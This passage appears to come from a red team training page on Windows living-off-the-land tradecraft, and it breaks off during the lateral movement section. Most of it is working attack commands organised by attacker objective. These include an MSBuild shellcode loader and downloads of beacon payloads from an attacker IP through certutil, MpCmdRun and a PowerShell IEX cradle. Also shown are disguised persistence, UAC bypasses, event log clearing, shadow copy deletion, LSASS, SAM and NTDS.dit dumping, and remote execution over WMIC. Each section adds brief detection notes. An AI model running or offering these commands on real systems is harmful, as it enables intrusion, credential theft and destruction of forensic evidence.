---
layout: training-page
title: "Windows Living Off the Land — Red Team Academy"
module: "Living Off the Land"
tags:
  - windows
  - lolbins
  - living-off-the-land
  - defense-evasion
  - t1218
  - t1105
  - t1053
  - t1021.003
  - t1021.004
  - t1546.015
  - t1564.004
  - t1563.002
  - t1218.009
  - t1218.013
  - applocker-bypass
  - dcom
  - wdigest
page_key: "lotl-windows"
render_with_liquid: false
---

# Windows Living Off the Land — Operational Red Team Guide

## Overview

This guide is structured around **red team objectives post-foothold** on Windows 10/11 or Server 2019/2022. It answers the question: *what can I do without dropping custom tools when the environment has EDR, application whitelisting, and an active blue team?*

The focus is **operational depth** — real command sequences organized by mission objective, not a binary catalog. For the basic LOLBins/LOLBAS catalog (certutil, mshta, regsvr32, rundll32, bitsadmin), see [LOLBins & LOLBAS](/evasion/lolbins/) and [LOLBAS Full Reference](/evasion/lolbas-reference/).

**Assumptions:**
- You have a shell (cmd or limited PowerShell) on a domain-joined machine
- The target is Windows 10/11 or Server 2019/2022, fully patched
- EDR is present and blocking common offensive tooling
- You want to avoid touching disk where possible

---

## 1. Execution / Code Execution

**MITRE:** T1218 — System Binary Proxy Execution

The goal: run a payload without spawning `powershell.exe`, `cmd.exe` directly, or dropping a PE to disk that triggers AV.

> **Scenario:** You have a foothold via a phishing macro. The target's EDR kills PowerShell.exe the moment it runs a download cradle. You need an alternative execution path to load your C2 beacon.

### 1.1 MSBuild — Inline Task Shellcode Loader

**Privilege required:** Low (standard user)  
**MITRE:** T1127.001

MSBuild is a Microsoft-signed .NET build engine. It can execute inline C# tasks from an XML project file — no compilation step, no dropped PE, no PowerShell.

```xml
<!-- === evil.csproj — MSBuild inline shellcode task === -->
<!-- Drop to disk as .csproj or .xml, then invoke via msbuild -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassicShellcode />
  </Target>
  <UsingTask TaskName="ClassicShellcode" TaskFactory="CodeTaskFactory"
             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassicShellcode : Task {
          [DllImport("kernel32")] static extern IntPtr VirtualAlloc(
            IntPtr a, uint s, uint t, uint p);
          [DllImport("kernel32")] static extern IntPtr CreateThread(
            IntPtr a, uint s, IntPtr sp, IntPtr p, uint c, IntPtr id);
          [DllImport("kernel32")] static extern uint WaitForSingleObject(
            IntPtr h, uint ms);
          public override bool Execute() {
            // Replace buf[] with your shellcode (msfvenom / Havoc / Sliver output)
            byte[] buf = new byte[] { 0xfc, 0xe8, 0x89, 0x00 /* ... */ };
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, mem, buf.Length);
            IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(t, 0xFFFFFFFF);
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```bash
# === Execute with MSBuild (ships with .NET Framework, always present) ===
# Path varies by .NET version — try all:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe evil.csproj

# Detection notes:
#  - msbuild.exe spawning network connections is highly anomalous
#  - Monitor: msbuild.exe with /target: flag or .csproj/.xml arguments
#  - Parent process of msbuild is often cmd.exe or explorer.exe — suspicious
#  - Sysmon Event ID 1: CommandLine contains ".csproj" or TaskFactory
```

### 1.2 WMIC XSL Script Transform

**Privilege required:** Low  
**MITRE:** T1220

WMIC can process XSLT stylesheets that contain embedded JScript or VBScript. The stylesheet is fetched from a remote URL and executed in-process.

```bash
# === WMIC XSL transform — remote fetch and execute ===
wmic os get /format:"http://10.10.14.5/evil.xsl"

# === evil.xsl — JScript execution via XSL ===
# <?xml version='1.0'?>
# <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" version="1.0"
#             xmlns:ms="urn:schemas-microsoft-com:xslt"
#             xmlns:user="placeholder">
#   <output method="text"/>
#   <ms:script implements-prefix="user" language="JScript">
#     <![CDATA[
#       var r = new ActiveXObject("WScript.Shell").Run("cmd /c whoami > C:\\out.txt",0,true);
#     ]]>
#   </ms:script>
#   <template match="/">
#     <value-of select="user:include()"/>
#   </template>
# </stylesheet>

# Detection notes:
#  - wmic.exe making outbound HTTP for /format: parameter
#  - Sysmon Event ID 3: wmic.exe establishing network connection
#  - Windows 11 + Server 2022: WMIC is deprecated and absent by default
```

### 1.3 Odbcconf — Register DLL via Response File

**Privilege required:** Low  
**MITRE:** T1218.008

```bash
# === odbcconf — execute DLL via REGSVR action in response file ===
# Create response file:
echo [REGSVR] C:\Windows\Temp\evil.dll > C:\Windows\Temp\resp.rsp
odbcconf.exe /A {REGSVR C:\Windows\Temp\evil.dll}
odbcconf.exe /f C:\Windows\Temp\resp.rsp

# Alternative: remote path
odbcconf.exe /A {REGSVR \\10.10.14.5\share\evil.dll}

# Detection notes:
#  - odbcconf.exe is rarely used in production; spawning child processes is anomalous
#  - Monitor: odbcconf.exe with /A or /f flags
#  - DLL loaded without standard ODBC path is suspicious
```

### 1.4 Forfiles — Indirect Command Execution

**Privilege required:** Low  
**MITRE:** T1218

Forfiles is designed to run commands against sets of files. The `/c` parameter accepts arbitrary commands, making it a simple proxy for cmd.exe.

```bash
# === forfiles as cmd.exe proxy ===
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c whoami"

# Execute a payload dropped to disk:
forfiles /p C:\Windows\Temp /m *.txt /c "cmd /c C:\Windows\Temp\beacon.exe"

# Detection notes:
#  - forfiles.exe is rarely invoked interactively; look for /c with cmd.exe
#  - Parent process chain: forfiles → cmd → payload is a clear pivot indicator
```

### 1.5 InstallUtil — .NET AppDomain Execution

**Privilege required:** Low  
**MITRE:** T1218.004

```bash
# === InstallUtil — bypass AppLocker via .NET installer class ===
# Compile a custom Installer subclass with payload in Uninstall():
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\evil.dll

# The /U flag calls Uninstall() which executes your code
# Even with AppLocker blocking .exe, InstallUtil is whitelisted
# Detection notes:
#  - InstallUtil.exe /U with non-standard paths is highly anomalous
#  - Sysmon: watch for InstallUtil spawning child processes
#  - AMSI may catch the .NET assembly content — use obfuscation
```

---

## 2. Download / Ingress

**MITRE:** T1105 — Ingress Tool Transfer

> **Scenario:** Network proxy blocks .exe and .dll extensions. PowerShell's `Invoke-WebRequest` is blocked by AMSI. You need to pull a second-stage payload onto the box using only built-in tools.

### 2.1 Certutil — Base64 Download and Decode

**Privilege required:** Low  
**MITRE:** T1105, T1140

```bash
# === certutil download + decode pattern ===
# Step 1: Serve file base64-encoded from your C2:
#   cat beacon.exe | base64 > beacon.b64
#   python3 -m http.server 8080

# Step 2: Download the encoded file
certutil.exe -urlcache -split -f http://10.10.14.5:8080/beacon.b64 C:\Windows\Temp\b.b64

# Step 3: Decode to executable
certutil.exe -decode C:\Windows\Temp\b.b64 C:\Windows\Temp\beacon.exe

# Alternative: download directly to ADS (hides from dir listing)
certutil.exe -urlcache -split -f http://10.10.14.5/b.b64 C:\Windows\Tasks\svchost.exe:beacon.b64
certutil.exe -decode C:\Windows\Tasks\svchost.exe:beacon.b64 C:\Windows\Temp\beacon.exe

# Detection notes:
#  - certutil.exe making outbound HTTP connections — very high fidelity IOC
#  - Windows Defender detects -urlcache pattern; use -encode/-decode chain instead
#  - Sysmon Event ID 3: certutil.exe → outbound TCP 80/443/8080
```

### 2.2 Desktopimgdownldr — Undocumented Downloader

**Privilege required:** Low  
**MITRE:** T1105

```bash
# === desktopimgdownldr — lockscreen image utility abused as downloader ===
# Set registry value to point to payload URL
reg add "HKCU\Control Panel\Personalization\LockScreenURL" /v LockScreenURL /d http://10.10.14.5/beacon.exe /f

# Trigger download (stores in %APPDATA%\Microsoft\Windows\LockScreenURL)
set SYSTEMROOT=C:\Windows\Temp & desktopimgdownldr.exe /lockscreenurl:http://10.10.14.5/beacon.exe /eventName:desktopimgdownldr

# The file lands as a random GUID name — find it:
dir C:\Windows\Temp\*.jpg /b  && dir C:\Windows\Temp\*.png /b

# Detection notes:
#  - desktopimgdownldr is rarely seen in enterprise; any execution is suspicious
#  - Monitor: registry key LockScreenURL set to non-Microsoft domain
```

### 2.3 Esentutl — File Copy via NTFS

**Privilege required:** Low  
**MITRE:** T1105

```bash
# === esentutl — JET database utility used as file copy proxy ===
# Copy file from UNC/SMB share without xcopy/robocopy:
esentutl.exe /y \\10.10.14.5\share\beacon.exe /d C:\Windows\Temp\beacon.exe /o

# Copy from local path:
esentutl.exe /y C:\source\file.exe /d C:\Windows\Temp\file.exe /o

# Copy to ADS:
esentutl.exe /y C:\Windows\System32\notepad.exe /d C:\Windows\Temp\svc.exe:data /o

# Detection notes:
#  - esentutl with /y flag copying from UNC paths is anomalous
#  - Legitimate use is almost exclusively JET database repair operations
```

### 2.4 Cmdl32 — VPN Config Download

**Privilege required:** Low  
**MITRE:** T1105

```bash
# === cmdl32 — Windows VPN configuration utility that performs HTTP downloads ===
# Create a fake profile file:
echo [connect] > C:\Windows\Temp\vpn.inf
echo EnableSplit=0 >> C:\Windows\Temp\vpn.inf

# Cmdl32 will HTTP-GET the URL from PhonebookPath:
cmdl32.exe /vpn /lan C:\Windows\Temp\vpn.inf

# More direct: craft profile with UpdateURL pointing to payload:
# [connect]
# EnableSplit=0
# UpdateURL=http://10.10.14.5/beacon.exe

# Detection notes:
#  - cmdl32.exe making outbound connections is unusual outside VPN environments
#  - Often missed by proxy categorization rules
```

### 2.5 Finger — Data Over Port 79

**Privilege required:** Low  
**MITRE:** T1105

```bash
# === finger.exe — legacy user-info protocol repurposed as exfil/download ===
# Serve data from attacker finger daemon (python3 finger_server.py):
finger payload@10.10.14.5

# Multi-chunk download (finger response limited to ~1KB per query):
# On attacker: split payload into chunks, serve via finger protocol
# On target:   loop finger queries, reassemble

# PowerShell-free base64 retrieval via finger:
for /f "delims=" %i in ('finger chunk1@10.10.14.5') do set B64=%i
# ...assemble and decode via certutil

# Detection notes:
#  - finger.exe (C:\Windows\System32\finger.exe) is extremely rare in enterprises
#  - Outbound port 79 should alert immediately
#  - Blocked at perimeter in most environments — test viability first
```

### 2.6 MpCmdRun — Defender's Own Downloader

**Privilege required:** Low  
**MITRE:** T1105

```bash
# === MpCmdRun.exe — Windows Defender command line, abusable as downloader ===
# MpCmdRun caches downloaded files during definition updates
"C:\Program Files\Windows Defender\MpCmdRun.exe" -DownloadFile -url http://10.10.14.5/beacon.exe -path C:\Windows\Temp\beacon.exe

# Detection notes:
#  - MpCmdRun with -DownloadFile flag for non-Microsoft URLs is a high-fidelity alert
#  - EDR solutions increasingly monitor for this specific abuse
#  - Works on fully patched Windows 11 as of 2024
```

---

## 3. Persistence

**MITRE:** T1053, T1547, T1546

> **Scenario:** Your beacon died after a reboot. You need persistent execution that survives reboots, doesn't require dropping obvious scheduled task XML files, and blends into normal Windows activity.

### 3.1 WMI Event Subscription — Reboot-Persistent Beacon

**Privilege required:** High (Administrator)  
**MITRE:** T1546.003

WMI subscriptions persist in the WMI repository (`C:\Windows\System32\wbem\Repository`), not as files on disk. They survive reboots and are missed by file-based forensics.

```bash
# === WMI event subscription — 3-part setup ===

# Part 1: Create an event filter (trigger condition)
# Fires 60 seconds after system boot
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE ^
  Name="SvcHealthCheck", ^
  Language="WQL", ^
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120", ^
  QueryLanguage="WQL", ^
  EventNamespace="\\root\\cimv2"

# Part 2: Create a consumer (action to take)
# ActiveScriptEventConsumer runs JScript/VBScript — no child .exe
wmic /namespace:"\\root\subscription" PATH ActiveScriptEventConsumer CREATE ^
  Name="SvcHealthConsumer", ^
  ScriptingEngine="JScript", ^
  ScriptText="var s=new ActiveXObject('WScript.Shell');s.Run('C:\\\\Windows\\\\Temp\\\\beacon.exe',0,false);"

# Part 3: Bind filter to consumer
wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding CREATE ^
  Filter="__EventFilter.Name='SvcHealthCheck'", ^
  Consumer="ActiveScriptEventConsumer.Name='SvcHealthConsumer'"

# === Verify subscription is in place ===
wmic /namespace:"\\root\subscription" PATH __EventFilter GET Name, Query /value
wmic /namespace:"\\root\subscription" PATH ActiveScriptEventConsumer GET Name /value
wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding GET Filter, Consumer /value

# === Clean up (when persistence no longer needed) ===
wmic /namespace:"\\root\subscription" PATH __EventFilter WHERE Name="SvcHealthCheck" DELETE
wmic /namespace:"\\root\subscription" PATH ActiveScriptEventConsumer WHERE Name="SvcHealthConsumer" DELETE
wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='SvcHealthCheck'" DELETE

# Detection notes:
#  - Microsoft-Antimalware-Amsi/Operational Event Log captures WMI script content
#  - Sysmon Event ID 19/20/21: WmiEventFilter, WmiEventConsumer, WmiEventConsumerToFilter
#  - Autoruns.exe (Sysinternals) enumerates WMI subscriptions
#  - PowerShell: Get-WMIObject -Namespace root\subscription -Class __EventFilter
```

### 3.2 Scheduled Tasks via Schtasks

**Privilege required:** Low (user tasks), High (SYSTEM tasks)  
**MITRE:** T1053.005

```bash
# === schtasks — create hidden scheduled task ===
# Run as SYSTEM on logon, blend with svchost name:
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateManager" ^
  /tr "C:\Windows\Temp\beacon.exe" ^
  /sc ONLOGON /ru SYSTEM /f

# Run every 4 hours (evades "on startup" detection heuristics):
schtasks /create /tn "Microsoft\Windows\Maintenance\HealthCheck" ^
  /tr "C:\Windows\Tasks\upd.exe" ^
  /sc HOURLY /mo 4 /ru SYSTEM /f

# Create task that runs cmd to execute in-memory PS (if PS not blocked):
schtasks /create /tn "Microsoft\Windows\Shell\ShellTask" ^
  /tr "cmd.exe /c powershell -ep bypass -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/run.ps1')\"" ^
  /sc ONLOGON /f

# === Query and manage ===
schtasks /query /tn "Microsoft\Windows\WindowsUpdate\UpdateManager" /v /fo LIST
schtasks /run /tn "Microsoft\Windows\WindowsUpdate\UpdateManager"
schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\UpdateManager" /f

# Detection notes:
#  - Tasks created with /ru SYSTEM by non-SYSTEM processes are suspicious
#  - Monitor task creation in: Event ID 4698 (Security log) or Sysmon Event ID 1 (schtasks.exe)
#  - Task XML stored in: C:\Windows\System32\Tasks\ — examine for anomalous entries
#  - Naming under Microsoft\Windows\ sub-paths is a common red team TTI
```

### 3.3 Registry Run Keys

**Privilege required:** Low (HKCU), High (HKLM)  
**MITRE:** T1547.001

```bash
# === reg.exe — add persistence to Run keys ===
# HKCU (no admin needed):
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
  /v "WindowsSecurityHealth" /d "C:\Windows\Temp\beacon.exe" /f

# HKLM (admin required, runs for all users):
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" ^
  /v "WinSvcManager" /d "C:\Windows\Temp\beacon.exe" /f

# Logon scripts (blends into Group Policy execution):
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /d "C:\Windows\Temp\beacon.exe" /f

# Less monitored run key locations:
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /d "explorer.exe,C:\Windows\Temp\beacon.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\beacon.exe," /f

# Detection notes:
#  - Autoruns, Sysmon EventID 13 (RegistryEvent) catch all Run key writes
#  - HKLM modifications from non-SYSTEM/admin process at off-hours — alert
#  - Blue team tip: Winlogon Shell/Userinit modifications are high-fidelity
```

### 3.4 Service Creation via SC.exe

**Privilege required:** High (Administrator)  
**MITRE:** T1543.003

```bash
# === sc.exe — create a persistent service ===
sc create SvcHealthMgr ^
  binpath= "C:\Windows\Temp\beacon.exe" ^
  start= auto ^
  DisplayName= "Windows Health Manager"

# Start immediately:
sc start SvcHealthMgr

# Blend in: use existing service binary path + add side-loaded DLL:
sc create WinNetSvc ^
  binpath= "C:\Windows\System32\svchost.exe -k netsvcs" ^
  start= auto

# Verify:
sc query SvcHealthMgr
sc qc SvcHealthMgr

# Detection notes:
#  - Event ID 7045 (System log): new service installed — extremely high value
#  - Services with binPath to non-standard locations (not System32) are suspicious
#  - Service name/display name mismatch with known Microsoft services
```

---

## 4. Privilege Escalation / UAC Bypass

**MITRE:** T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC

> **Scenario:** Your beacon runs at medium integrity (standard user). The target has UAC enabled but not set to "Always Notify." You need to escalate to high integrity without triggering a UAC prompt.

### 4.1 Fodhelper UAC Bypass

**Privilege required:** Medium integrity (standard user in Administrators group)  
**MITRE:** T1548.002

Fodhelper.exe is an auto-elevating binary that launches with high integrity without a UAC prompt. It reads a registry key before launching — we hijack that key.

```bash
# === fodhelper.exe UAC bypass ===
# Step 1: Create hijack registry path
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f

# Step 2: Disable delegate execute to force command execution
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f

# Step 3: Trigger fodhelper — our cmd.exe launches at high integrity
fodhelper.exe

# Verify elevation:
whoami /groups | findstr "High Mandatory"
# Or in the spawned cmd.exe: whoami /priv — should show SeDebugPrivilege

# Weaponized one-liner (execute beacon instead of cmd):
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\Temp\beacon.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
fodhelper.exe

# === Clean up afterwards ===
reg delete "HKCU\Software\Classes\ms-settings" /f

# Detection notes:
#  - Sysmon Event ID 13: Write to HKCU\Software\Classes\ms-settings\
#  - fodhelper.exe spawning cmd.exe or non-standard child processes — high fidelity
#  - Process integrity level jump (medium → high) without user UAC prompt
```

### 4.2 Eventvwr UAC Bypass

**Privilege required:** Medium integrity  
**MITRE:** T1548.002

```bash
# === eventvwr.exe UAC bypass ===
# eventvwr reads HKCU\Software\Classes\mscfile\shell\open\command before launch

reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Windows\Temp\beacon.exe" /f
eventvwr.exe

# Clean up:
reg delete "HKCU\Software\Classes\mscfile" /f

# Detection notes:
#  - Same registry write pattern — monitor HKCU\Software\Classes\mscfile
#  - Patched on some Windows 10 builds (1903+); test environment first
```

### 4.3 Computerdefaults UAC Bypass

**Privilege required:** Medium integrity  
**MITRE:** T1548.002

```bash
# === computerdefaults.exe UAC bypass ===
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c C:\Windows\Temp\beacon.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
computerdefaults.exe

# Clean up:
reg delete "HKCU\Software\Classes\ms-settings" /f

# Detection notes:
#  - Same ms-settings hijack as fodhelper — blue team monitoring for this key
#  - Rotate bypass technique if one is detected
```

### 4.4 CMSTP Auto-Elevate

**Privilege required:** Medium integrity  
**MITRE:** T1218.003, T1548.002

CMSTP is a Connection Manager Profile Installer that auto-elevates and can execute arbitrary commands from an INF file.

```bash
# === cmstp.exe — INF file execution with auto-elevation ===
# Create malicious INF file (evil.inf):
# [version]
# Signature=$chicago$
# AdvancedINF=2.5
# [DefaultInstall_SingleUser]
# UnRegisterOCXs=UnRegisterOCXSection
# [UnRegisterOCXSection]
# %11%\scrobj.dll,NI,http://10.10.14.5/evil.sct
# [Strings]
# AppAct = "SOFTWARE\Microsoft\Connection Manager"
# ServiceName="VPN"
# ShortSvcName="VPN"

cmstp.exe /ni /s C:\Windows\Temp\evil.inf
# /ni: no interactive, /s: silent — accepts UAC automatically

# Detection notes:
#  - cmstp.exe is almost never used in modern environments
#  - cmstp.exe with /ni /s flags + non-standard INF path is a clear IOC
#  - Network connection from cmstp.exe is highly anomalous
```

---

## 5. Defense Evasion — Covering Tracks

**MITRE:** T1070 — Indicator Removal, T1562 — Impair Defenses

> **Scenario:** You have achieved your objectives and need to clear evidence before exiting. The blue team will review logs after an alert. Remove event logs, shadow copies, and traces of your activity using built-in tools.

### 5.1 Wevtutil — Event Log Clearing

**Privilege required:** High (Administrator)  
**MITRE:** T1070.001

```bash
# === wevtutil — clear specific event logs ===
# List all available logs:
wevtutil el

# Clear security log (removes logon/logoff, process creation, privilege use):
wevtutil cl Security

# Clear system log (removes service installs, reboots):
wevtutil cl System

# Clear application log:
wevtutil cl Application

# Clear Sysmon operational log (if Sysmon is installed):
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# Clear PowerShell logs:
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Nuclear option — clear all logs in a loop:
for /f %x in ('wevtutil el') do wevtutil cl %x

# === More surgical: delete specific Event IDs ===
# Export log, filter out your entries, re-import (advanced):
wevtutil epl Security C:\Windows\Temp\sec.evtx
# (offline manipulation, then re-import — rarely worth the complexity)

# Detection notes:
#  - Clearing logs generates Event ID 1102 (Security) and 104 (System) — ironic
#  - SIEM with forwarding captures logs before local deletion — log forwarding defeats this
#  - Wazuh, Splunk, Sentinel with real-time forwarding: log clear has zero effect
#  - Still valuable against local-only logging or delayed SIEM ingestion
```

### 5.2 Vssadmin — Delete Shadow Copies

**Privilege required:** High (Administrator)  
**MITRE:** T1490

Shadow copies allow recovery without backups. Delete them to complicate forensics and prevent VSS-based credential extraction by defenders.

```bash
# === vssadmin — list and delete shadow copies ===
# Enumerate existing shadow copies:
vssadmin list shadows

# Delete all shadow copies (ransomware-style — noisy but effective):
vssadmin delete shadows /all /quiet

# Delete shadows for specific volume:
vssadmin delete shadows /for=C: /quiet

# Alternative using wmic (same result, different binary):
wmic shadowcopy delete

# Alternative using diskshadow:
diskshadow.exe /s C:\Windows\Temp\del.txt
# del.txt contains: delete shadows all

# Detection notes:
#  - Shadow copy deletion is a tier-1 ransomware indicator — will trigger SIEM rules
#  - Event ID 8222 (WMI) or VSS provider logs capture this
#  - Use only if forensic prevention is worth the detection risk
```

### 5.3 Cipher — Secure File Wipe

**Privilege required:** Low  
**MITRE:** T1485

```bash
# === cipher — overwrite deleted file space to prevent carving ===
# Wipe free space on C: (overwrites unallocated clusters 3 times):
cipher /w:C:\

# Wipe specific directory's free space:
cipher /w:C:\Windows\Temp

# Detection notes:
#  - cipher.exe with /w flag is unusual in normal operations
#  - Long runtime (minutes to hours) may be noticed by monitoring
#  - Does NOT delete live files — delete files first, then wipe
```

### 5.4 Icacls — Hide Files via ACL Manipulation

**Privilege required:** High for system files, Low for user files  
**MITRE:** T1222.001

```bash
# === icacls — deny access to your files from defenders/IR teams ===
# Remove all inherited permissions and grant only SYSTEM access:
icacls "C:\Windows\Temp\beacon.exe" /inheritance:r /grant:r "SYSTEM:(F)"

# Deny Everyone read access to a directory:
icacls "C:\Windows\Temp\loot" /deny Everyone:(R,W,D,X)

# Remove deny rule (clean up):
icacls "C:\Windows\Temp\beacon.exe" /remove:d Everyone

# Detection notes:
#  - ACL changes on temp directories are logged in Security Event ID 4670
#  - Unusual deny ACEs on files in system directories
```

### 5.5 Fsutil — Disable Last Access Timestamp

**Privilege required:** High (Administrator)  
**MITRE:** T1070

```bash
# === fsutil — disable last access time updates (complicates timeline forensics) ===
fsutil behavior set disablelastaccess 1

# Re-enable (cleanup):
fsutil behavior set disablelastaccess 0

# Query current state:
fsutil behavior query disablelastaccess

# Detection notes:
#  - Registry write: HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisableLastAccessUpdate
#  - This is also set in some performance-optimized enterprise configs — context matters
```

---

## 6. Credential Access

**MITRE:** T1003 — OS Credential Dumping

> **Scenario:** You need local admin credentials for lateral movement, but Mimikatz triggers EDR. You have high integrity access and need to dump credentials using only built-in Windows tools.

### 6.1 LSASS Dump via Comsvcs.dll MiniDump

**Privilege required:** High (SeDebugPrivilege)  
**MITRE:** T1003.001

Comsvcs.dll ships with Windows and exports `MiniDump`. It can dump any process to a minidump file without loading Mimikatz.

```bash
# === comsvcs.dll MiniDump — LSASS dump without Mimikatz ===
# Step 1: Get LSASS PID
tasklist | findstr lsass
# Or: wmic process where name='lsass.exe' get ProcessId

# Step 2: Dump LSASS using rundll32 + comsvcs.dll
# Replace 784 with actual LSASS PID:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 784 C:\Windows\Temp\lsass.dmp full

# Step 3: Exfil the .dmp file and parse offline with:
#   pypykatz lsa minidump lsass.dmp
#   or load in Mimikatz: sekurlsa::minidump lsass.dmp && sekurlsa::logonpasswords

# Alternative: PowerShell (if available) with Out-MiniDump or comsvcs:
# [System.Reflection.Assembly]::LoadFile("comsvcs.dll")

# === Using Task Manager (GUI, leaves less CLI forensics) ===
# Task Manager → Details → Right-click lsass.exe → Create Dump File
# Dump saved to: C:\Users\<user>\AppData\Local\Temp\lsass.DMP

# Detection notes:
#  - rundll32.exe accessing lsass.exe memory: Sysmon Event ID 10 (ProcessAccess)
#  - Writing .dmp to disk triggers many EDR solutions immediately
#  - PPL (Protected Process Light) on LSASS blocks this without a PPL bypass driver
#  - Windows 11 / Server 2022: Credential Guard + PPL enabled by default — this technique fails
```

### 6.2 SAM and SYSTEM Hive Export

**Privilege required:** High (Administrator)  
**MITRE:** T1003.002

```bash
# === reg.exe — export SAM, SYSTEM, SECURITY hives offline ===
# Export hives (shadow copy required for SAM because it's locked while running):
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive
reg save HKLM\SECURITY C:\Windows\Temp\sec.hive

# Exfil and parse offline:
# impacket-secretsdump -sam sam.hive -system sys.hive -security sec.hive LOCAL

# Detection notes:
#  - reg.exe saving HKLM\SAM is a near-certain indicator of credential theft
#  - Event ID 4663: Object Access to SAM registry key
#  - Many EDRs block direct SAM access — use VSS copy technique below
```

### 6.3 NTDS.dit via Diskshadow + Esentutl

**Privilege required:** High (Domain Admin or equivalent)  
**MITRE:** T1003.003

Active Directory credentials are in NTDS.dit on domain controllers. The file is locked while AD is running — use VSS to access a shadow copy.

```bash
# === diskshadow — VSS-based NTDS.dit extraction on a DC ===
# Create diskshadow script file:
echo set context persistent nowriters > C:\Windows\Temp\shadow.txt
echo set metadata C:\Windows\Temp\meta.cab >> C:\Windows\Temp\shadow.txt
echo begin backup >> C:\Windows\Temp\shadow.txt
echo add volume C: alias cdrive >> C:\Windows\Temp\shadow.txt
echo create >> C:\Windows\Temp\shadow.txt
echo expose %cdrive% Z: >> C:\Windows\Temp\shadow.txt
echo end backup >> C:\Windows\Temp\shadow.txt

# Execute:
diskshadow.exe /s C:\Windows\Temp\shadow.txt

# Copy NTDS.dit from shadow:
esentutl.exe /y Z:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ntds.dit /o

# Copy SYSTEM hive for decryption key:
reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive

# Unmount shadow:
diskshadow.exe /s C:\Windows\Temp\cleanup.txt
# cleanup.txt: delete shadows all

# Parse offline:
# impacket-secretsdump -ntds ntds.dit -system sys.hive LOCAL

# Detection notes:
#  - diskshadow.exe with script file on a DC is very high fidelity
#  - VSS shadow creation on a DC outside change windows is suspicious
#  - ntds.dit access via any mechanism logged in Directory Service log
```

### 6.4 Ntdsutil — Offline Snapshot Dump

**Privilege required:** High (Domain Admin)  
**MITRE:** T1003.003

```bash
# === ntdsutil — create NTDS snapshot and extract ===
# Launch ntdsutil in activation mode:
ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\ntdsout" quit quit

# This creates a complete IFM (Install From Media) directory containing:
# C:\Windows\Temp\ntdsout\Active Directory\ntds.dit
# C:\Windows\Temp\ntdsout\registry\SYSTEM

# Parse offline:
# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Detection notes:
#  - ntdsutil.exe ifm/create is a well-known DC attack — detected by most SIEM rules
#  - Event ID 4688 (process creation) for ntdsutil.exe on a DC = immediate alert
#  - Generates IFM-related events in Directory Service event log
```

---

## 7. Lateral Movement

**MITRE:** T1021 — Remote Services, T1047 — Windows Management Instrumentation

> **Scenario:** You have compromised credentials (NTLM hash or plaintext) for a local admin account that is shared across the environment. You need to move to a target host without using PsExec (blocked by EDR) and without leaving a footprint outside of Windows built-ins.

### 7.1 WMIC Lateral Execution

**Privilege required:** High (local admin on remote target)  
**MITRE:** T1047

```bash
# === wmic /node: — execute process on remote host ===
# Using plaintext credentials:
wmic /node:192.168.1.50 /user:CORP\administrator /password:Password123 ^
  process call create "cmd.exe /c C:\Windows\Temp\beacon.exe"

# Using current session credentials (pass-the-hash via pth-wmic or impacket):
wmic /node:192.168.1.50 process call create "powershell -ep bypass -w hidden -c IEX ..."

# One-liner: copy and execute beacon via WMIC:
wmic /node:192.168.1.50 /user:administrator /password:Password123 ^
  process call create "cmd /c copy \\10.10.14.5\share\beacon.exe C:\Windows\Temp\beacon.exe && C:\Windows\Temp\beacon.exe"

# Verify execution (check if process started):
